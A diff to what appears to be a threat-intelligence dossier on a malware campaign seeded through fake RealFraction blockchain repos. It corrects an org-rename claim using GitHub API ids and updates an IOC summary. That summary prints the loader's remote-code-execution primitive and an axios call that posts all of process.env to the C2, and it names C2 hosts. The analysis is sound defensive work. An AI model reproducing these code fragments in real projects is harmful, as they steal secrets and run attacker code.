@@ -262,7 +262,39 @@ Recording the response (including TLS certificate chain, response headers, and f
 
 A targeted cluster-expansion sweep was performed from this sandbox, seeded on the distinctive strings in the loader (C2 host, C2 path, magic header, eval primitive paired with the magic header) and on the distinctive contract names in the Solidity tree (`FractionalPropertyToken`, `FractionalPropertyFactory`, `RealFractionToken`, `PropertyNft`, `RentalManager`, `RealFraction` brand). Findings:
 
-- **One sibling repo identified at original-analysis time: `ChainVisitaTech/realfraction-mvp`.** A second GitHub repo carrying the same RealFraction MVP codebase under a different owning org. Identified via Google search results that quote the exact same README opening line (`"RealFraction is a blockchain-powered smart real estate platform"`) and the same Solidity contract names. Both the `ChainVisitaTech` org page and the `ChainVisitaTech/realfraction-mvp` repo returned **HTTP 404** from the original sandbox. **Update (2026-05-18 cluster-expansion sweep):** the org was **renamed** to `chainvisita-protocols`, not removed. The successor repo at `chainvisita-protocols/realfraction-mvp` is **live**, and its `server/utils/regionChecker.js` is byte-identical to `realfraction/realfraction`'s except for the C2 URL suffix (`3aeb34a38` vs `3aeb34a31`). **Loader presence confirmed via direct fetch.** Confidence upgraded from medium-high to **high**. See §7.5 for the full cluster catalog.
+- **One sibling repo identified at original-analysis time: `ChainVisitaTech/realfraction-mvp`.** A second GitHub repo carrying the same RealFraction MVP codebase under a different owning org. Identified via Google search results that quote the exact same README opening line (`"RealFraction is a blockchain-powered smart real estate platform"`) and the same Solidity contract names. Both the `ChainVisitaTech` org page and the `ChainVisitaTech/realfraction-mvp` repo returned **HTTP 404** from the original sandbox. **Update (2026-05-18 cluster-expansion sweep):** a second org `chainvisita-protocols` appeared carrying the same codebase. The repo at `chainvisita-protocols/realfraction-mvp` was **live**, and its `server/utils/regionChecker.js` is byte-identical to `realfraction/realfraction`'s except for the C2 URL suffix (`3aeb34a38` vs `3aeb34a31`). **Loader presence confirmed via direct fetch.** Confidence upgraded from medium-high to **high**. See §7.5 for the full cluster catalog.
+
+  > **Correction (2026-09-20, exfil-chris):** this bullet previously said
+  > `ChainVisitaTech` was **renamed** to `chainvisita-protocols`. The GitHub API
+  > shows they are **two separate orgs**, not one renamed org:
+  >
+  > | | `ChainVisitaTech` | `chainvisita-protocols` |
+  > |---|---|---|
+  > | org id | **262482246** | **266603464** |
+  > | created | 2026-02-19T02:38:00Z | 2026-03-09T01:47:29Z |
+  > | public repos | 14 | 12 |
+  > | own `realfraction-mvp` | repo id 1161560486, created 2026-02-19 | repo id 1215632871, created 2026-04-20 |
+  >
+  > A GitHub org rename preserves the numeric id and 301-redirects the old slug.
+  > Here there are two ids and **no redirect in either direction** —
+  > `api.github.com/orgs/ChainVisitaTech` returns `200` with its own id.
+  >
+  > The original read was reasonable: `github.com/ChainVisitaTech` does return
+  > **HTTP 404 on the web**, matching the "returned HTTP 404 from the original
+  > sandbox" note above. But the API returns `200`. Both orgs are now in that
+  > state — **web 404, API 200** — which is GitHub suspension, not a rename.
+  > A suspended predecessor plus a live successor is near-indistinguishable from
+  > a rename unless the id is checked:
+  >
+  > ```bash
+  > gh api /orgs/ChainVisitaTech       -q '.id, .created_at'
+  > gh api /orgs/chainvisita-protocols -q '.id, .created_at'
+  > curl -sI https://api.github.com/orgs/ChainVisitaTech | grep -i '^location' || echo "no redirect"
+  > ```
+  >
+  > Both `realfraction-mvp` repos now 404 by name **and** by id, so the code is no
+  > longer retrievable from either. The loader analysis, C2 list and sub-shape
+  > taxonomy in this dossier are unaffected.
 - **No additional GitHub orgs / users identified at original-analysis time.** The original sandbox's egress policy blocked authenticated GitHub code search, so the AjunaVerse-incident-style sweep could not be replicated. The catalogued footprint of two repos was a **lower bound**.
 - **No public C2-hostname hits via Google at original-analysis time.** A site-restricted search for `"ipregionchecker.com" site:github.com` returned zero relevant hits.
 
@@ -394,7 +426,7 @@ Both are in-scope. See [`abuse-report-vercel.md`](./abuse-report-vercel.md) and 
 Owners of confirmed sibling repos partition cleanly into three groups:
 
 - **Operator-owned (suspend)** — small, recently-created orgs or single-purpose user accounts whose repo list is overwhelmingly campaign-shape:
-  - Orgs: `realfraction` · `chainvisita-protocols` · `Chainbits1` · `Lynqex-Labs` · `metapulse54` · `RockTxoi` · `jaiu3d` · `kio87j` · `BVSLabs` (with `chainvisita-protocols` and `Lynqex-Labs` additionally exhibiting the **credibility-farming TTP** — forking ~5–11 well-known crypto/blockchain projects on the same day the org was created to pad the public profile).
+  - Orgs: `realfraction` · `chainvisita-protocols` · `Chainbits1` · `Lynqex-Labs` · `metapulse54` · `RockTxoi` · `jaiu3d` · `kio87j` · `BVSLabs` (with `chainvisita-protocols`, `ChainVisitaTech` and `Lynqex-Labs` additionally exhibiting the **credibility-farming TTP** — forking ~5–11 well-known crypto/blockchain projects on the same day the org was created to pad the public profile).
   - Users: `Cortexa-org` (despite the `-org` suffix this is a User account; multi-lure-theme persona spanning `NitroGem` + `EHR-Demo` + `intelhealthcare` + `Neura-MVP`) · `0xbrentfi`.
   - Uncertain-leans-operator: `ricardomartins9899` · `sparsh-kr24` (both single-repo accounts but with creation dates older than the typical operator-throwaway window).
 
@@ -417,7 +449,7 @@ Summary of what's new in [`iocs.csv`](./iocs.csv) / [`iocs.json`](./iocs.json) f
 - **Code patterns**: the new RCE primitive `new Function.constructor("require", errCode)`; the env-exfil-at-loader-stage `axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } })`; the buggy `axios.post(api, { headers: ... })` variant; the distinctive sub-shape G constants template.
 - **HTTP headers**: `x-vercel-error: DEPLOYMENT_DISABLED` (observed on the two disabled deployments — corroborating signal that a known C2 has been taken down); `Server: Vercel` (on the live `isillegalregion.com` host).
 - **Hashes**: the stage-2 payload SHA-256 / SHA-1 / size (see §7.6).
-- **GitHub entities**: 9 new operator-owned orgs (excluding the renamed `ChainVisitaTech` → `chainvisita-protocols`), 2 operator-owned users, 2 uncertain-leans-operator users, 14 likely-compromised-legitimate users, 27 confirmed sibling repos (plus 3 inferred siblings on confirmed-operator-owned accounts).
+- **GitHub entities**: 9 new operator-owned orgs (**see correction in §7.1: `ChainVisitaTech` is a separate org, not a former name of `chainvisita-protocols`, which makes 10**), 2 operator-owned users, 2 uncertain-leans-operator users, 14 likely-compromised-legitimate users, 27 confirmed sibling repos (plus 3 inferred siblings on confirmed-operator-owned accounts).
 
 ### 7.10 Catalog impact (post-sweep update)
 
